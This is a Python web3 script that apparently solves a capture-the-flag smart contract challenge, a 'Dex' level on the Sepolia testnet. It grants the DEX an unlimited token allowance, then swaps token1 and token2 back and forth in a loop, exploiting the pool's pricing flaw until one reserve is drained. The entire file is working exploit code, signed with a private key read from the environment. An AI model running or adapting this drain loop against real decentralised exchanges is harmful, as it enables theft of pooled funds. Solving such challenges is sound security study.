import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
player = w3.to_checksum_address(os.getenv('WALLET'))


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()
    compiled_sol = solcx.compile_source(contract_source)
    contract_key = f'<stdin>:{contract_name}' if contract_name else next(iter(compiled_sol))
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


def send_tx(transaction):
    # We have 1-line .transact() for state changes, but it works only if you are using a local node like Ganache, Anvil
    # Or your account is unlocked in the node (like Infura), which is rare in public networks. So we need below steps
    transaction = transaction.build_transaction({
        'from': player,
        'chainId': 11155111,
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(player))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)
    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Completed transaction: {tx_receipt}')
    return tx_receipt


# Step 1: Load
dex_address = w3.to_checksum_address("")
erc_compiled_contract = compile_contract("./ERC20.sol", '0.8.0', "ERC20")
dex_compiled_contract = compile_contract("./Dex.sol", '0.8.0', "Dex")
dex = w3.eth.contract(address=dex_address, abi=dex_compiled_contract['abi'])
token1 = w3.eth.contract(address=dex.functions.token1().call(), abi=erc_compiled_contract['abi'])
token2 = w3.eth.contract(address=dex.functions.token2().call(), abi=erc_compiled_contract['abi'])

# Step 2: Approve DEX to move unlimited tokens
send_tx(token1.functions.approve(dex_address, 2**256 - 1))
send_tx(token2.functions.approve(dex_address, 2**256 - 1))
print("Approving DEX to move unlimited tokens...")

# Assert initial balances
p1 = token1.functions.balanceOf(player).call()
p2 = token2.functions.balanceOf(player).call()
d1 = token1.functions.balanceOf(dex_address).call()
d2 = token2.functions.balanceOf(dex_address).call()
# assert p1 == 10 and p2 == 10, "Player must start with 10 of each token"
# assert d1 == 100 and d2 == 100, "DEX must start with 100 of each token"

# Step 3: Swap loop
from_token = token1
from_address = token1.address
to_token = token2
to_address = token2.address
i = 0
tmap = {from_address: 'token1', to_address: 'token2'}  # Just for readability in print statements

while True:
    i += 1
    balance = from_token.functions.balanceOf(player).call()
    if balance == 0:
        # Swap direction
        from_token, to_token = to_token, from_token
        from_address, to_address = to_address, from_address
        print('Swapped from & to as balance == 0 at i', i)
        continue

    # Calculate max we can safely send
    from_balance = from_token.functions.balanceOf(player).call()
    to_balance = to_token.functions.balanceOf(player).call()
    dex_from_balance = from_token.functions.balanceOf(dex.address).call()
    dex_to_balance = to_token.functions.balanceOf(dex.address).call()

    if from_balance == 0 or dex_to_balance == 0:
        print("Swap halted: insufficient balance.")
        break

    amount = min(from_balance, dex_from_balance)  # don't try to swap more than DEX or attacker has
    print(f"[{i}] Swapping {amount} of", tmap[from_token.address], "→", tmap[to_token.address])
    send_tx(dex.functions.swap(from_address, to_address, amount))

    # Check if DEX is drained
    if to_token.functions.balanceOf(dex_address).call() == 0:
        print("🎯 DEX drained of", to_token.address)
        break

    # Flip direction
    from_token, to_token = to_token, from_token
    from_address, to_address = to_address, from_address

print('Total loops', i)
# Final Assertions
final_token1 = token1.functions.balanceOf(dex_address).call()
final_token2 = token2.functions.balanceOf(dex_address).call()
assert final_token1 == 0 or final_token2 == 0, "One of the DEX token reserves must be 0"
print("✅ Challenge complete! Final DEX balances:")
print("Token1:", final_token1, "Token2:", final_token2)
